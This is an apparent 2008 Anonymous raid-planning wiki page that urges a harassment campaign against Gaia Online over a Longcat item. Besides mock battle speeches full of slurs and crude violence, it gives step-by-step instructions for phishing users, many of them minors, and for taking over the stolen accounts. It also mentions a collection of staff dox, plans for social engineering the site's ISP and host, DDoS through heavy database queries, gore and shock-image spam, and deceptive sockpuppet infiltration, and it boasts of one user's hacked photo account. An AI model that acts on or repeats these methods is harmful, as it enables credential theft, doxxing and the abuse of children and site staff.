=Intro=

In 2008 Gaia added a Longcat scarf to their item inventory in a haunting reminder of the Subeta Wars. Of course, the General Discussion,

their parallel of /b/, went insane with "WE'RE GONNA GET RAPED" or "4CHAN WON'T CARE AT ALL" while everyone else debated it as well. The owners/admins of Gaia, however, did not give a fuck:

'''IMPORT IMAGES HERE, LULZ'''

==Timeline==

* Sometime over the third week of March 2008: Gaia Online added a Longcat Scarf. Their ORLY and YARLY hats had been largely ignored, but Longcat is too much for Anon. They also added a Monorailcat Halo which is just gay, and an epic fail hat which included a half-assed Guy Fawks mask and the 1/0 meme.
* Psyops report that the item will soon be taken out of stores over the next week. This doesnt mean shit because the stuff still exists. 14:23, 1 April 2008 (PDT)
* Psyops report that the removal of the item is directly tied to our threats, but the item isn't being removed from the site. 15:56, 1 April 2008 (PDT)
* Item was removed, however, current owners of the item still have it. Psyops teams have been working to get it out of the possession of Gaiafags.


==Discussion==

This SHOULD be easy. We learned from Subeta the do's and do-nots. However, the diaspora of Anonymous after /b/day and the influx of newfags, many from the very den of evil we wish to vanquish, have made it

necessary to completely repeat the lessons all true anonymous should know. This wiki is to educate, inform, motivate, and guide. USE IT! RTFM! While we change strategies and adapt quickly, once the attack begins,

we will not have a lot of second chances if we make any mistakes. DON'T FUCK THIS UP!

We find ourselves at another test of our mettle, our dignity, and our worthiness as true anonymous. Our holiest meme has been stolen, and Catnarok is yet again nigh.

But let's stop the dramatic bullshit and get to the nitty gritty, shall we? The big festering cunt that is Gaia that gave us the newfag invasion just fucking bitchslapped us, and being anons we're not gonna take it. Gaia is most likely at least somewhat secure (though even the best security can't protect a stupid userbase, which is what most of you should be focusing on!) and most likely will not buckle under anything on the mediocre side of a truly massive DDoS. While if anonymous can muster a DDoS that can take out CoS websites (and prolexic for that matter...) we can probably knock off Gaia for a period of time, we can not rely on this to be an end. It will scare, intimidate, and force a reaction, but needs to be used properly and in a planned manner. Ultimately, we have to fuck them up like we fucked up Subeta, to pressure them to shut down Gaia.

Disregard what the cock above this paragraph wrote, as he obviously didn't know what the fuck he was talking about. DDoS attacks don't work on Gaia, due to the fact that they have over 20 dedicated servers that host their forums. If we want to do any serious damage to this site, we're gonna have to come up with a new method of attack. Subeta was only defeated when we achieved Keith Kurson's credit card numbers and ordered thousands upon thousands of Bel-Air boxed sets with them. Let's try doing something like that.

===A rousing speech===

/b/tards, traps, Anonymous, lend me your ears. I come to bury Longcat, not to praise him. The evil that men do lives after them; the good is oft interred with their bones. So let it be with Longcat. The noble Gaiafags hath told you Longcat was of Gaia. If it were so, it was a grievous fault, And grievously hath Longcat answered it. Here, under leave of the Gaiamods and the rest. For Gaia is an honorable site; So are they all, all honorable Gaiafags. Come I to speak in Longcat's funeral. He was my Longcat, looong and loooonger to me. But Gaiafags say he was of Gaia, and the Gaiafags are honorable men. He hath brought many lulzcows with His looongness, whose lulz did the general coffers fill. Did this in Longcat seem of Gaia? When that Anonymous hath fapped, Longcat hath praised. Gaiafaggitry should be made of sterner stuff. Yet Gaiafags say he was of Gaia, and Gaia is an honorable site. You all did see that on the Caturday I thrice presented him with the Gaiast of honors, which he did thrice refuse. Was he of Gaia? Yet the Gaiafags say he was of Gaia, and, sure, the Gaiafags are honorable men. I speak not to disprove what the Gaiafags say, but here I am to speak what I do know. You all did lol with him him once, not without cause. What cause withholds you then to mourn for him? O judgment! Thou art fled to brutish beasts, and Anonymous have lost their reason. Bear with me. My heart is in the coffin there with Longcat, and I must pause till it comes back to me.
Memetheft hath come again my /b/rothers. Rise and ride with /b/ for vengeance and victory against the perpetrators of this memetheft. Of the treasonous theft of Longcat. CRY HAVOC AND LET SLIP THE CATS OF WAR!

===Speech Found on 7chan===

A thousand insults I shall bear, but I received now one too many.
This exhortation comes to you in dark times. I remember a day when Anonymous truly was the Legion we boast so much about. I remember a time, when merely uttering the word Anonymous would send a chill running down the spine of Gaiafags and have the furfags packed and running. I look back with nostalgia at the moments when we truly did not forgive and truly did not forget - when we truly did own the Internet. Sadly, I can no longer say these moments to exist today.
In no ways should you consider me an oldfag; my dealings with Anonymous started long before Subeta, but not that long. Consider me an agingfag.
I heard of this scar, Gaia, upon my (our) Internet thanks to you folks. I had always found emos repulsive and these people only added more fuel to my hate. Naturally, I did as all normal people would do; I went straight to LI and destroyed them from the inside out. Now I have been known throughout the Internet by many names, call me Umizara or jorgonsmith, legacy or MaDCoW; from the moment I began those raids, I carried one appellation - Anonymous.
And today /b/, /i/, and fellow Anon, I ask but one thing from all of you: take back your proper name!
Take back the Holy Longcat and the ever Unholy Tacgnol!
Take back the O'Rly Owl, the once beloved meme!
Take back the fear we once held!
Take back our name, Anonymous!
There is an "i" in /i/nsurgency, and it stands for "us"
So together, may we take back the fear we once held.
May we take back the act to never forgive!
May we take back the act to never forget!
And for the good of us all: Take back the Internet so it may lie in our hands once more!
Anonymous, as I write these final words, I wonder but one thing. Will you Veterans of the Longcat Crusades, Gaia Raids, and the Fight Against Furfaggotry sit back and once again let newfags and Diggfags fuck this up more than they did to our CoS Raids? Or will you pick up arms once more, and fight for glory one last time?

tl;dr -> FOR LONGCAAAAAAAAAAAAAAAAAAAAAAAAT!

===King Of Anon Army Speech's===

Anonymous arose and strode swiftly to the microphone. The Anonymous snapped to their feet and stood silently. Anonymous surveyed the sea of brown with a grim look. "Be seated", he said. Anonymous' voice rose high and clear.

"Anonymous, this shit that some fuckers sling around about /i/ wanting out of this war, not wanting to fight, is a crock of shit. /i/ loves to fight, traditionally. All real /i/nsurgents love the sting and clash of battle. You are here today for three reasons. First, because you are here to defend longcat. Second, you are here for your own self respect, because you would not want to be anywhere else. Third, you are here because you are Anonymous and all Anonymous like to fight. /i/ will not tolerate a loser. /i/ despises cowards. /i/ plays for win all of the time. I wouldn't give a hoot in hell for an /i/diot who lost and laughed. That's why /i/ has never lost nor will ever lose a war; for the very idea of losing is hateful to /i/."

Anonymous paused and looked over the crowd. "You are not all going to be bored," he said slowly. "Only two percent of you right here today would be bored during a major battle. Boredom must not be feared. Bordom, in time, comes to all Anonymous. Yes, Anonymous is scared in his first battle. If he says he's not, he's a liar. Some Anonymous are cowards but they fight the same as the brave Anonymous or they get the hell slammed out of them watching Anonymous fight who are just as scared as they are. The real hero is the /i/nsurgent who fights even though he is bored. Some Anonymous get over their boredom in a minute. For some, it takes an hour. For some, it takes days. But Anonymous will never let his boredom overpower his honor, his sense of duty to his porn collection, and his innate manhood. Battle is the most magnificent competition in which Anonymous can indulge. It brings out all that is best and it removes all that is base. Anonymous pride themselves on being Anonymous and they ARE Anonymous. Remember that the enemy is frightened. They are not Anonymous."

Anonymous's grim expression did not change. "There are four thousand neatly marked dormant IPs somewhere in the US", he roared into the microphone, "All because someone got bored and went to sleep on the job". He paused and Anonymous grew silent. "But they are furfag IPs, because Anonymous caught the bastard asleep before they did. We have the finest food, the finest equipment, the best spirit, and the best Anonymous in the world", Anonymous bellowed. He lowered his head and shook it pensively. Suddenly he snapped erect, faced the Anonymous belligerently and thundered, "Why, by God, I actually pity those poor furfag sons-of-bitches we're going up against. By God, I do".

"Anonymous doesn't surrender", Anonymous continued, "and I don't want to hear of any /i/nsurgent raiding fucking SciFags...regain your honor, you can still fight. That's not just bullshit either. You are the kind of Anonymous like the Anonymous in Florida, who, with 12 beers in him, jerked off, raided Colette, raped over 3 gigs from gaia, jerked off again, ripped 7 tranny torrents, spammed three forums, then took down two servers before those fags knew what the fuck was coming off. And, all of that time, this Anonymous had a bullet through a lung from the goddamn FBI because of his loli collection. There was a real Anonymous!"

"All Anonymous are not storybook haxxors, either. Every single Anonymous in /i/ plays a vital role. Don't ever let up. Don't ever think that your job is unimportant. Every Anonymous has a job to do and he must do it. Every Anonymous is a vital link in the great chain. What if every Anonymous suddenly decided that he didn't like the whine of his CPU fan, turned yellow, and went to bed? The cowardly bastard could say, "Hell, they won't miss me, just one Anonymous in thousands". But, what if every Anonymous thought that way? Where in the hell would we be now? What would /i/ be like? The goddamn gaiafags, that's what. No, Goddamnit, /i/ don't think like that. Every Anonymous does his part. Every Anonymous is important in the vast scheme of this war.

We don't want yellow cowards or fucking internet white knights in this fight. They should be killed off like rats. If not, they will go home after this war and breed more of their kind. The brave Anonymous will breed more brave Anonymous. Kill off the Goddamned cowards and we will have a world of brave Anonymous.

"Don't forget," Anonymous barked, "rule 1 and rule 2. The world is not supposed to know what the hell happened to it. Let the first bastards to find out be the Goddamned gaiafags. Some day I want to see them raise up on their piss-soaked hind legs and howl, 'Jesus Christ, it's it's a lion! Get in the Goddamned car!"

"We want to get the hell over there", Anonymous continued, "The quicker we clean up this Goddamned mess, the quicker we can take a little jaunt against the purple pissing emos and clean out their nest, too. Before Goddamned ebaums gets all of the credit."

Anonymous continued quietly, "Sure, we want to raid somewhere else. We want this war over with. The quickest way to get it over with is to go get the bastards who started it. The quicker they are whipped, the quicker we can go somewhere else. The shortest way home is through gaia. And when we take down gaia", he yelled, "I am personally going to jerk off all over that furfag, longcat stealing son-of-a-bitch's servers. We'll win this war, but we'll win it only by fighting and by showing those gaia cocksuckers that we've got more guts than they have; or ever will have. We're not going to just take down the sons-of-bitches, we're going to rip out their living Goddamned guts and use them to grease our hard drive motors. We're going to murder those lousy furfag cocksucker's sites by the bushel-fucking-basket."

"We are advancing constantly and we are not interested in holding onto anything, except the enemy's balls. We are going to twist his balls and kick the living shit out of him all of the time. Our basic plan of operation is to advance and to keep on advancing regardless of whether we have to go over, under, or through the enemy. We are going to go through him like crap through a goose; like shit through a tin horn!"

"From time to time there will be some complaints that we are pushing our people too hard. I don't give a good Goddamn about such complaints. I believe in the old and sound rule that an ounce of sweat will save a gallon of blood. The harder WE push, the more gaia sites we will kill. I want you all to remember that."

===A Suggestion from a Gaia Oldfag===

"Meme theft is unforgiveable but Gaia is not likely to listen to such arguments. Another way to make them listen would be to inundate them with emails (and other forms of communication) illuminating the horrors they just unleashed on a bunch of kids. Longcat is innocent, but what will happen to Gaia when the gaiafags discover Rule 34, Goatse, Centipede Filled Vagina, and the like? Whose responsibility will that be when millions of kids are scarred for life? It may be a little low on the lulz, but we still get our goal and scare the living shit out of Gaia. It could even prevent further memes from being stolen and facilitate the Gaia/*chan barrier so they don't have to deal with it in the future. Just a thought."

"For getting the kids off the chans, you're on your own."

===Jesus' Position on Gaia===

"I don't think much of it."

==GOALS==

The current goal is not to shut down Gaia; Gaia is the anti-thesis to /b/, the Bizzaro world, and if it is gone then all it's users have only a few places to go- 4chan being the biggest. What we need to do is:

1. Remove Longcat
2. Remove the other memes
3. Scare the minds of as many people as we can, showing them the true sinister nature of Anon that they might finally realize that *chan is not a "cool kids" club and they leave/their parents ban them from the twisted pornographic webistes that are imageboards. 

Long Term/Secondary Goals and demands to make

* Some kind of Gaia/*chan barrier, IE *chan discussion of any kind is banned/wordfiltered on Gaia 

'''UPDATE''': this just in. most of the meme based items come from one item: the infinity hat.(yes it costs real money) the target is now somewhat simpler to attack. focus on their cash shop, where they sell their pixels by whatever means necessary for legendary win.

=Targets=

The main target is of course Gaia Online, its administration, its userbase, and the site itself. Allow us to break things down.

As with Subeta, win is clearly visible when one of their devs give into our demands. Therefore the devs AND their product (irl jewgolds at stake for them) are our two main targets, either directly or indirectly. Anything we can do to them and their product (exploits, troll communitty, report it for having dickgirl artists drawing their art/dicks/etc). A little bit of exploits (maybe 4-8 hours of work?) can cost them thousands of irl jewgolds to fix and patch. Just as with any business, they can't use longcat to make money if its revenue doesn't exceed its cost by a good margin.

As for the userbase, we need to keep them from associating with any *chans. Phising is very effective as opposed to community trolling, the idea here is to spam shock on comment pages of anyone having these images. High priority to fags containing 5+ stolen memes (ie: Saint Mudkip). Also, mods cannot delete these comments all at once, they have to sit there and delete each one. Abuse this. Also, do not let bad gossip = good gossip, make sure anything associated with this contains gore/dead kittens/etc, stuff that wouldn't help give gaia PR nor give their usebase a reason to want stolen memes.

==Fan Websites==

A list of target websites is required. Post all fan sites and any blogs of note.

==People==

DOX ON GAIA STAFF ARE HERE

Roughly Thirty of them, all with varying degrees of accuracy and detail.

Here go any findings of the interactions between Gaia players, to aid in the PsyOps. Please add any relevant information of perseon-to-person interaction, common conversation topics, quirk, etc.

* A lot of people on Gaia are underage B&. They talk about school.
* Gaia Users love to cry and complain about Gaia itself. They had no Easter event in March.
* "Drama", believe it or not, is fairly uncommon in Gaia. Unless you go into the GD.
* The emo thing is very popular in Gaia. If you want to blend in, act like the biggest emo tool EVAR.
* Playground rules apply, stuff like "Finders, keepers" and "NO FAIR!!!!!" are commonplace.
* Very little interaction goes on in the minigames, Forums are best for insurgency.
* Fashion has no place in Gaia, suit up in the most expensive crap you can, doesn't matter if it matches or makes your ass look big.
* If you must socialize in minigames, to the the puzzle game. Interaction there is easiest.
* Many important Gaia Users hang out in guilds.
* Gaia Users love 'avatar art' 


==Gaia Forums==

Courtesy of our best psyop, there are some things you need to know when choosing a forum to psyop or troll. First of all, you cannot troll the General Discussion. It is basically 4chan's /b/ and in trolling this, they will just laugh at you. General Discussion, or GD, moves too fast to perform any worthwhile psyopping and most people there frequent /b/ on a daily basis. If you attempt to troll GD you will fail epically.


You'll want to focus on forums such as Life Issues, Extended Discussion, Gaia Community Discussion, Questions & Assistance, and Welcome to Gaia. Blasting it's new userbase in Welcome to Gaia can be worthwhile and funny, and it also provides a chance to phish said new userbase. Another way to exploit stupid people is through their Q&A forum. If someone needs help then they are more receptive to you and more trusting.


Please use your brain while choosing your targets. Gaia is huge and trying to focus on one person to psyop can be very exhausting, especially if you fail. Never use shock images alone. Always vary your shock images and pair them up alongside huge.jpg's so that if a user is caught in your thread, they will probably have their computer freeze up with the shock images on their screen. Many people also have fast modems; use multiple hueg images uploaded from different places. Max damage will be achieved. If you find yourself getting collateral damage (ie your computer blows up from hueg3s), you are still doing it right, it just means you're an idiot.


We are working on raid tools right now for the forums. Please be patient for when these come out, their forums will have a shitstorm. Right now Gaia is indeed under siege by not only us, but bots and scammers. We are not bots. We are intelligent and thus can deliver upon our raid targets with pinpoint accuracy.

=PsyOps=

PsyOps are spies we place to spread dissent, disinformation, information, black and white propoganda, cause confusion and panic, and all sorts of trickery. You must become the enemy and live among them, acting like them, talking like them, etc. In the end you suicide out with gorespam.

==Code of PsyOps==

   1. Never reveal psyops names to anyone
   2. Never attempt to contact another suspected Anonymous, at all.
   3. Never drop memes or do anything to allow suspicion that you are Anonymous.
   4. Play ignorant of *chans, a casual knowledge is fine, expertise is not.
   5. Watch yourself for slipups, common ones are /r/ and other shorthand, "moar" "liek" and other intentional misspellings, "butthurt" "x-fag" and other common titles/names that are not used outside of *chans. 


==How-to==

READ THE ARTICLE ON PSYOPS, it covers everything here and details on a good name, deceptive online habits, etc.

==Fit in==

   1. Lurk moar on their side, observe, try to fit in.
   2. Pay attention, make friends.
   3. Write notes to yourself. Journalize, keep dates and important events. Use just a word document on your own comp.
   4. Don't act like Anonymous at all. No memes, not even subtle ones; go crazy with how cool "lolcats" are and just look like an Internet user, not a *channer.
   5. Use the power of women. Either be a women, pretend to be a women, get an actual women to help (cam-whores are best), or get pictures of women from the internet. Protip: edit out jj.am watermarks. 


In essence, stick to the 5 step plan for win. Get in, fit in, GET INFORMATION, SHARE INFORMATION! DO NOT FUCKING TROLL, YET. Look for drama-weak individuals and drama generating techniques (consult ED for common things to look for) and easy to socially engineer people with power and/or influence. If you are a chick or a trap, that will be most useful as well. SEX APPEAL WORKS.

Easy topics to begin with in Lifestyle Discussion are: "I think she might be pregnant!", "Parents are getting Divorced", "My boy/girlfriend left me", "I think s/he likes me". Bonus points for small typos and 14 year old attitude. Religion topics are assured replies. BE CREATIVE!

See the article on PsyOps for more details on this art.

=Propaganda=

Anonymous needs to know and needs to care. Artfags, make some propaganda and put it on the /b/oards among the chans. We need recruits, we need help, and when the time comes we need proxies to post epic

threads where we distribute links to the wiki and to raidpacks. Get working, make it funny, to the point, motivating, and epic. For now post links to this Wiki page or a tinyURL that does it. FOR GREAT JUSTICE.

'''TO BE IMPORTED, LULZ'''

=1337 H4X=

==Phishing==

Come to the IRC and prove your worth to get a phishing link.

Social engineering works on their internet infrastructure just as much as the target itself. Their ISP, host, DNS, bla bla bla. If you're good enough to try it, try it. If you think you'll fail, don't, you'll alert them to what we're doing - but again, at least some part of Gaia already knows if you're reading this.

===What do to with a phished account===

1. First off, change the password and email. Go to MyGaia -> Account

2. As always check if that pass works with their email address, and from there change all security questions and private info (jot it down in notepad) and go about trolling friends, family, pretending they are coming out, suicidal, etc. Also delete accounts and work. Destroy.

OR

1. For now, spread the phish and delete items they are holding, or sending all the items to one other player will cause the mods to think its some sort of scam and get them both banned. We will later develop advanced economic fuxxors. If IRC approves gorespam via PMs and other such horrors should be unleashed (proxy for CP). Attack.

2. Get on IRC to ask for advice. 


===Phishing Domains===

Come into the IRC to get a phishing url or suggest a domain.

Post in 4chan's /a/ for epic phishing, but beware of banhappy mods! Permaban from all boards is in store if they see you.

==DDoS and haxx==

===DDoS===

While a direct DDoS attack is nigh on impossible (They had at least 100 servers as of 2006) it is possible we could use an SQL-intensive query with wget or some other form of rapage to get them down/borked/lagged for a period of time. For the meantime, scout for exploits in Gaia and other fan sites if you see a vulnerability that could be expolited for hacking or denial of service, bring it to the IRC channel.

[[Image:GaiaEpicWin3.jpg|200px|thumb|left|Gaia - Keeping users safe since 2008]]

At around 4am on March 26th, the user by the name of Rananterial was targeted by Anonymous as part of one of the first targets. The crack into her photobucket delivered much lulz. Her photos were switched with gore and much of her irreplaceable pictures were deleted. We also recovered fuzzy photos of cleavage, but a motion was approved to man harpoons.
